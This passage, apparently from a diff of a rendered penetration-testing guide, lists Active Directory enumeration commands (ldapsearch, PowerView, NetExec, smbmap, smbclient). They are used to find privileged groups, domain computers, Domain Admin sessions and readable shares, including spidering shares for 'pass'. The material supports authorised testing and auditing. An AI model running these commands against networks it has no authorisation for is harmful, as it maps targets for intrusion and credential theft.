+<p>Groups with names suggesting privilege:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=group)(|(cn=*admin*)(cn=*operator*)(cn=*backup*)(cn=*helpdesk*)(cn=*it*)))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>cn<span class="w"> </span>member<span class="w"> </span>description
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Get-DomainGroup</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Enterprise Admins&quot;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Administrators&quot;</span>
+</span></code></pre></div>
+<p>Recursive membership:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recurse</span>
+</span></code></pre></div>
+<p>Groups for a user:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">alice</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">memberof</span>
+</span></code></pre></div>
+<p><strong>AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nb">Get-ADGroup</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="nb">Get-ADGroupMember</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recursive</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nb">Get-ADPrincipalGroupMembership</span> <span class="n">alice</span>
+</span></code></pre></div>
+<p><strong>Groups worth checking</strong></p>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Domain Admins</code></td>
+<td>High privilege in the domain.</td>
+</tr>
+<tr>
+<td><code>Enterprise Admins</code></td>
+<td>High privilege across the forest.</td>
+</tr>
+<tr>
+<td><code>Schema Admins</code></td>
+<td>Can modify schema.</td>
+</tr>
+<tr>
+<td><code>Administrators</code></td>
+<td>Built-in privileged group.</td>
+</tr>
+<tr>
+<td><code>Account Operators</code></td>
+<td>Account management privileges.</td>
+</tr>
+<tr>
+<td><code>Server Operators</code></td>
+<td>Server/DC management context.</td>
+</tr>
+<tr>
+<td><code>Backup Operators</code></td>
+<td>Backup/restore-related privileges.</td>
+</tr>
+<tr>
+<td><code>Print Operators</code></td>
+<td>Printer-related privileges on DCs.</td>
+</tr>
+<tr>
+<td><code>Remote Desktop Users</code></td>
+<td>RDP access.</td>
+</tr>
+<tr>
+<td><code>Remote Management Users</code></td>
+<td>WinRM access.</td>
+</tr>
+<tr>
+<td><code>DnsAdmins</code></td>
+<td>DNS admin context.</td>
+</tr>
+<tr>
+<td><code>Group Policy Creator Owners</code></td>
+<td>GPO creation rights.</td>
+</tr>
+<tr>
+<td><code>Helpdesk</code></td>
+<td>Often delegated access.</td>
+</tr>
+<tr>
+<td><code>IT</code> / <code>Support</code></td>
+<td>Often operational privileges.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Nested membership</strong></p>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>alice
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  -&gt; Helpdesk
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>  -&gt; IT Admins
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>  -&gt; Server Operators
+</span></code></pre></div>
+<p>Nested groups can hide privilege paths.</p>
+<p>Always check recursive group membership when possible.</p>
+<hr />
+<h2 id="computers">Computers</h2>
+<p>Computer enumeration maps domain-joined hosts.</p>
+<p>Computer objects help identify workstations, servers, DCs, operating systems, naming conventions, SPNs, delegation flags, and possible lateral movement targets.</p>
+<p><strong>NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--computers
+</span></code></pre></div>
+<p>SMB sweep:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>All computers:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=computer)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>operatingSystem<span class="w"> </span>operatingSystemVersion<span class="w"> </span>servicePrincipalName<span class="w"> </span>memberOf<span class="w"> </span>userAccountControl<span class="w"> </span>lastLogonTimestamp
+</span></code></pre></div>
+<p>Enabled computers:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>operatingSystem
+</span></code></pre></div>
+<p>Domain controllers:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>sAMAccountName<span class="w"> </span>dNSHostName
+</span></code></pre></div>
+<p>Windows servers:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=computer)(operatingSystem=*Server*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>operatingSystem
+</span></code></pre></div>
+<p>Computers with SPNs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=computer)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">Get-DomainComputer</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="nb">Get-DomainComputer</span> <span class="n">-OperatingSystem</span> <span class="s2">&quot;*Server*&quot;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="nb">Get-DomainController</span>
+</span></code></pre></div>
+<p>Useful formatting:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nb">Get-DomainComputer</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">dnshostname</span><span class="p">,</span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">lastlogontimestamp</span>
+</span></code></pre></div>
+<p><strong>AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="n">dNSHostName</span><span class="p">,</span><span class="n">OperatingSystem</span><span class="p">,</span><span class="n">OperatingSystemVersion</span><span class="p">,</span><span class="n">lastLogonTimestamp</span><span class="p">,</span><span class="n">servicePrincipalName</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">Get-ADDomainController</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span></code></pre></div>
+<p><strong>Host role hints</strong></p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Possible role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DC01</code>, <code>AD01</code></td>
+<td>Domain controller.</td>
+</tr>
+<tr>
+<td><code>FS01</code>, <code>FILE01</code></td>
+<td>File server.</td>
+</tr>
+<tr>
+<td><code>SQL01</code>, <code>DB01</code></td>
+<td>Database server.</td>
+</tr>
+<tr>
+<td><code>WEB01</code>, <code>IIS01</code></td>
+<td>Web server.</td>
+</tr>
+<tr>
+<td><code>APP01</code></td>
+<td>Application server.</td>
+</tr>
+<tr>
+<td><code>CA01</code>, <code>PKI01</code></td>
+<td>AD CS / certificate services.</td>
+</tr>
+<tr>
+<td><code>SCCM01</code>, <code>MECM01</code></td>
+<td>Endpoint management.</td>
+</tr>
+<tr>
+<td><code>WSUS01</code></td>
+<td>Update server.</td>
+</tr>
+<tr>
+<td><code>JUMP01</code>, <code>PAW01</code></td>
+<td>Admin/jump workstation.</td>
+</tr>
+<tr>
+<td><code>BACKUP01</code></td>
+<td>Backup server.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="sessions">Sessions</h2>
+<p>Session enumeration tries to identify where users are logged in or where user context exists.</p>
+<p>This is important because a machine with a privileged user session can become more valuable than its hostname suggests.</p>
+<p>Session data can come from SMB/RPC, Remote Registry, WinRM, RDP session info, BloodHound collection, or local access.</p>
+<p><strong>NetExec logged-on users</strong></p>
+<p>Workstation service method:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--loggedon-users
+</span></code></pre></div>
+<p>Hunt for a specific user:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--loggedon-users<span class="w"> </span>administrator
+</span></code></pre></div>
+<p>Remote Registry method:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--reg-sessions
+</span></code></pre></div>
+<p>RDP session query:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--qwinsta
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="nb">Find-DomainUserLocation</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-UserIdentity</span> <span class="n">alice</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">FILE01</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="nb">Get-NetLoggedon</span> <span class="n">-ComputerName</span> <span class="n">FILE01</span>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="nb">Get-LoggedOnLocal</span> <span class="n">-ComputerName</span> <span class="n">FILE01</span>
+</span></code></pre></div>
+<p><strong>Windows built-ins</strong></p>
+<p>On a host you can access:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>query user
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>qwinsta
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>whoami
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>whoami /groups
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>net session
+</span></code></pre></div>
+<p>Remote query if allowed:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>qwinsta /server:HOSTNAME
+</span></code></pre></div>
+<p><strong>Session interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Low-privileged user on workstation</td>
+<td>Normal user activity.</td>
+</tr>
+<tr>
+<td>Admin user on workstation</td>
+<td>Potentially interesting target.</td>
+</tr>
+<tr>
+<td>Domain Admin on server</td>
+<td>High-value session.</td>
+</tr>
+<tr>
+<td>Service account session</td>
+<td>May indicate running service or scheduled task.</td>
+</tr>
+<tr>
+<td>RDP active session</td>
+<td>Interactive user context.</td>
+</tr>
+<tr>
+<td>Registry session</td>
+<td>Loaded profile, not always interactive.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Important distinction</strong></p>
+<p><code>--loggedon-users</code>, <code>--reg-sessions</code>, and <code>--qwinsta</code> do not show the exact same thing.</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>What it suggests</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--loggedon-users</code></td>
+<td>Logged-on users from workstation service.</td>
+</tr>
+<tr>
+<td><code>--reg-sessions</code></td>
+<td>Loaded user registry hives / profile context.</td>
+</tr>
+<tr>
+<td><code>--qwinsta</code></td>
+<td>Interactive RDP/terminal sessions.</td>
+</tr>
+<tr>
+<td>BloodHound Session</td>
+<td>Session relationships collected by SharpHound.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="shares">Shares</h2>
+<p>Share enumeration identifies accessible SMB shares and files.</p>
+<p>After getting a valid domain user, share access usually expands beyond anonymous or guest access.</p>
+<p><strong>NetExec</strong></p>
+<p>List shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p>Only readable or writable shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares<span class="w"> </span>READ
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares<span class="w"> </span>WRITE
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares<span class="w"> </span>READ,WRITE
+</span></code></pre></div>
+<p>Spider shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME
+</span></code></pre></div>
+<p>Spider and search for patterns:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--spider<span class="w"> </span>SHARENAME<span class="w"> </span>--pattern<span class="w"> </span>pass
+</span></code></pre></div>
+<p><strong>smbmap</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-R
+</span></code></pre></div>
+<p>Download a file:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>--download<span class="w"> </span><span class="s1">&#39;SHARE\\path\\file.txt&#39;</span>
+</span></code></pre></div>
+<p><strong>smbclient</strong></p>
+<p>List shares:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$TARGET</span>/<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Connect to share:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/SHARENAME<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<p>Recursive listing:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/SHARENAME<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+</span></code></pre></div>
